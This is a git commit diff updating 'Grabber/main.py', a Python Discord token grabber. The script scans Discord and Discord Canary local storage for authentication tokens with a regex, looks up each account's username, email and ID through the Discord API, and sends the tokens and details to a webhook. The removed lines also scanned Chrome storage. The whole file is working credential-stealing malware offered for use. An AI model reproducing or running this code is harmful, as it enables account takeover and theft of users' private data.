db7017e5b845c4021772a529b54be262dec5c3da
fweak1337 <freakgamer2331@gmail.com>
2020-04-05 20:20:06 -0700

    Update main.py

--- Grabber/main.py
+++ Grabber/main.py
@@ -1,38 +1,42 @@
-import os, re, requests
+import os, re, requests, platform
 
-WEBHOOK = "YOUR WEBHOOK URL"
-APPDATA = os.environ.get("APPDATA")
+WEBHOOK = "YOUR WEBHOOK LINK HERE"
+APPDATA = os.getenv("APPDATA") if platform.system() == "Windows" else os.getenv('XDG_CONFIG_HOME', os.getenv('HOME')+'/.config') if platform.system() == "Linux" else None
+TOKENS = []
+DIRS = [f"{APPDATA}\\Discord\\Local Storage\\leveldb", f"{APPDATA}\\discordcanary\\Local Storage\\leveldb"]
 
-dirs = [
-f"{APPDATA}\\Discord\\Local Storage\\leveldb", 
-f"{APPDATA}\\discordcanary\\Local Storage\\leveldb", 
-f"{os.environ.get('USERPROFILE')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
-]
+def post():
+    for token in TOKENS:
+        _data = requests.get("https://discordapp.com/api/v6/users/@me", headers={"authorization": token})
 
-def post(hook:str, message:str):
-    _payload = {
-        "content": f'```\n{message}```'   
-    }
-    requests.post(hook, json=_payload)
+        if _data.status_code != 404 or _data.status_code != 401:
+            _info = _data.json()
+            _payload = {"content": f'''
+```asciidoc
+= {_info["username"]}#{_info["discriminator"]} =
+TOKEN :: {token}
+EMAIL :: {_info["email"]}
+ID :: {_info["id"]}
+NITRO :: {"Yes" if _info['premium_type'] else "No"}
+```'''}
+            requests.post(WEBHOOK, json=_payload)
 
-for location in dirs:
-    for file in os.listdir(location):
-        with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _data:
-            try:
-                regex = re.findall(r"N\w+\.\w+\.\w+|mfa\.\w+\-\_?\w+\-\_?\w+", _data.read())
-                if regex:
-                    for reg in regex:
-                        post(WEBHOOK, reg);
-            except PermissionError:
+def getTokens():
+        for location in DIRS:
+            if os.path.isdir(location):
+                for file in os.listdir(location):
+                    try:
+                        with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _file:
+                            tokenSearch = re.findall(r"N\w+\.\w+\.\w+|mfa\.\w+\-\_?\w+\-\_?\w+", _file.read())
+                            if tokenSearch:
+                                for token in tokenSearch:
+                                    TOKENS.append(token)
+                    except:
+                        continue
+            else:
                 continue
-input(" Press enter to close" )
 
 
-
-
-
-
-
-
-
-# Specwiel tanks to /xanthe1337
+if __name__ == "__main__":
+    getTokens()
+    post()
